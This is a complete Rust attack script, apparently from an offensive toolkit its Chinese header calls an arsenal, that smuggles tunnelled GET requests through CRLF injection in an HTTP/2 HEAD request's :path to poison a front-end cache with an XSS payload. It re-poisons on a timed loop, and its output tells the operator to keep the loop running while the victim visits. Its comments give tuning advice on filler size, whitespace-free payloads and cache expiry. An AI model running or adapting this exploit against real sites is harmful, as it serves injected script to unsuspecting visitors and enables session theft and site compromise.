#!/usr/bin/env rust-script
//! name: h2_tunnel_head_poison
//! description: H2 HEAD-tunnel 缓存投毒循环件 - 发一条 HTTP/2 HEAD 请求,其 :path 用 CRLF 注入若干隧道 GET(一条把载荷塞进 Location 的 /resources/<seg>?<payload> 重定向 + 两条大响应垫页);前端对 HEAD 也按 Content-Length 读体,于是把隧道响应的原始字节(含裸载荷)当作 HEAD 的响应体缓存到 HEAD 的 URL 键上;按 --interval-secs 反复重投,受害者每次来访都撞上毒化的条目。
//!   rules: (1) 垫片总量必须 >= 外层 Content-Length(题 8641B),否则前端一直等读、我们一条回执都收不到(挂死而非报错);(2) 载荷不得依赖空白分隔属性——`<img/src=x/onerror=alert(1)>` 会被解析成单个 `src=x/onerror=alert(1)`,不产生 onerror;无空白可执行形用 `<script>alert(1)</script>` 或 `<svg/onload=alert(1)>`;(3) 缓存命中无法覆写:条目变干净后只能等 max-age 过期,故 --interval-secs 要比受害者的访问周期密得多。
//! version: 1.0.2
//! args: <url> [--payload '<script>alert(1)</script>'] [--filler /post?postId=1] [--seg x] [--rounds N] [--interval-secs N] [--marker S] [--read-ms N] [--selftest]
//! keywords: h2, tunnelling, cache-poison, head, crlf, poison-loop, 武器库, 漏洞猎手套件
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::{ClientConfig, RootCertStore};
use tokio_rustls::TlsConnector;
use url::Url;

struct Cfg {
    host: String,
    port: u16,
    path: String,
    read_ms: u64,
    marker: String,
}

#[tokio::main]
async fn main() {
    let _ = rustls::crypto::ring::default_provider().install_default();
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut url = String::new();
    let mut payload = "<script>alert(1)</script>".to_string();
    let mut filler = "/post?postId=1".to_string();
    let mut seg = "x".to_string();
    let mut rounds = 1usize;
    let mut interval = 8u64;
    let mut marker: Option<String> = None;
    let mut read_ms = 3000u64;
    if args.iter().any(|a| a == "--selftest") {
        let host = "example.test";
        let p = poison_path(host, "x", "<script>alert(1)</script>", "/post?postId=1");
        let ok = p.starts_with("/ HTTP/1.1\r\n")
            && p.contains("GET /resources/x?<script>alert(1)</script> HTTP/1.1")
            && p.contains("GET /post?postId=1 HTTP/1.1")
            && !p.contains("HTTP/1.1 HTTP/1.1");
        pi_rust_lib::report::success(
            "h2_tunnel_head_poison",
            json!({"selftest": if ok { "ok" } else { "fail" }, "path": p}),
            "assembly keeps each tunnelled request line intact",
        )
        .unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--payload" => { i += 1; if let Some(v) = args.get(i) { payload = v.clone(); } }
            "--filler" => { i += 1; if let Some(v) = args.get(i) { filler = v.clone(); } }
            "--seg" => { i += 1; if let Some(v) = args.get(i) { seg = v.clone(); } }
            "--rounds" => { i += 1; rounds = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(rounds).max(1); }
            "--interval-secs" => { i += 1; interval = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(interval); }
            "--marker" => { i += 1; if let Some(v) = args.get(i) { marker = Some(v.clone()); } }
            "--read-ms" => { i += 1; read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms); }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if url.is_empty() {
        pi_rust_lib::report::failure(
            "h2_tunnel_head_poison",
            "missing url",
            "call as: h2_tunnel_head_poison <url> [--rounds 20] [--interval-secs 8] [--payload '<script>alert(1)</script>']",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);
    let marker = marker.unwrap_or_else(|| payload.clone());
    let path = poison_path(&host, &seg, &payload, &filler);
    let cfg = Cfg { host, port, path, read_ms, marker };

    let deadline: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(120.0);
    let started = std::time::Instant::now();
    let mut rows: Vec<Value> = Vec::new();
    let mut poisoned = 0usize;
    for r in 1..=rounds {
        pi_rust_lib::timeout::check();
        match exchange(&cfg).await {
            Ok(cell) => {
                let miss = cell.x_cache.as_deref() == Some("miss");
                if miss && cell.marker_seen {
                    poisoned += 1;
                }
                rows.push(json!({
                    "round": r,
                    "status": cell.status,
                    "x_cache": cell.x_cache,
                    "content_length": cell.content_length,
                    "bytes": cell.bytes,
                    "marker_seen": cell.marker_seen,
                    "poisoned": miss && cell.marker_seen,
                }));
            }
            Err(e) => rows.push(json!({"round": r, "error": e})),
        }
        if r < rounds {
            if started.elapsed().as_secs_f64() + interval as f64 > deadline * 0.95 {
                rows.push(json!({"note": "deadline headroom: stopping early", "rounds_done": r}));
                break;
            }
            tokio::time::sleep(Duration::from_secs(interval)).await;
        }
    }
    pi_rust_lib::report::success(
        "h2_tunnel_head_poison",
        json!({
            "url": url,
            "payload": payload,
            "filler": filler,
            "rounds": rows.len(),
            "poisoned_rounds": poisoned,
            "rounds_detail": rows,
        }),
        "a poisoned round (x-cache miss with your payload in the body) means the HEAD key now serves your bytes; keep the loop running while the victim visits",
    )
    .unwrap_or(());
}

fn poison_path(host: &str, seg: &str, payload: &str, filler: &str) -> String {
    format!(
        "/ HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/{seg}?{payload} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {filler} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {filler} HTTP/1.1\r\nHost: {host}\r\nX:"
    )
}

struct Cell {
    status: Option<String>,
    x_cache: Option<String>,
    content_length: Option<u64>,
    bytes: usize,
    marker_seen: bool,
}

async fn exchange(cfg: &Cfg) -> Result<Cell, String> {
    let mut roots = RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(cfg.host.clone()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((cfg.host.as_str(), cfg.port))
        .await
        .map_err(|e| format!("connect {}:{}: {e}", cfg.host, cfg.port))?;
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;
    tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let headers: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), b"HEAD".to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), cfg.host.as_bytes().to_vec()),
        (b":path".to_vec(), cfg.path.as_bytes().to_vec()),
    ];
    let block = hpack::Encoder::new().encode(headers.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    tls.write_all(&frame(1, 0x4 | 0x1, 1, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;

    let (status, hdrs, body) = read_response(&mut tls, cfg.read_ms).await?;
    let get = |name: &str| -> Option<String> {
        hdrs.iter()
            .find(|(n, _)| n.eq_ignore_ascii_case(name))
            .map(|(_, v)| v.clone())
    };
    Ok(Cell {
        status,
        x_cache: get("x-cache"),
        content_length: get("content-length").and_then(|v| v.parse().ok()),
        bytes: body.len(),
        marker_seen: body.windows(cfg.marker.len()).any(|w| w == cfg.marker.as_bytes()),
    })
}

async fn read_response<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    stream: &mut S,
    read_ms: u64,
) -> Result<(Option<String>, Vec<(String, String)>, Vec<u8>), String> {
    let mut decoder = hpack::Decoder::new();
    let mut status: Option<String> = None;
    let mut hdrs: Vec<(String, String)> = Vec::new();
    let mut body: Vec<u8> = Vec::new();
    let idle = Duration::from_millis(read_ms.max(200));
    let mut raw_total = 0usize;
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, stream.read_exact(&mut hdr)).await {
            Err(_) => break,
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, stream.read_exact(&mut payload)).await.is_err() {
            break;
        }
        raw_total += 9 + len;
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = stream.flush().await;
                }
            }
            6 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(6, 0x1, 0, &payload)).await;
                    let _ = stream.flush().await;
                }
            }
            1 | 9 => {
                if let Ok(list) = decoder.decode(&payload) {
                    for (n, v) in list {
                        let name = String::from_utf8_lossy(&n).to_string();
                        let value = String::from_utf8_lossy(&v).to_string();
                        if name == ":status" {
                            status = Some(value.clone());
                        } else {
                            hdrs.push((name, value));
                        }
                    }
                }
            }
            0 => body.extend_from_slice(&payload),
            _ => {}
        }
        if raw_total > 4_000_000 {
            break;
        }
    }
    Ok((status, hdrs, body))
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}
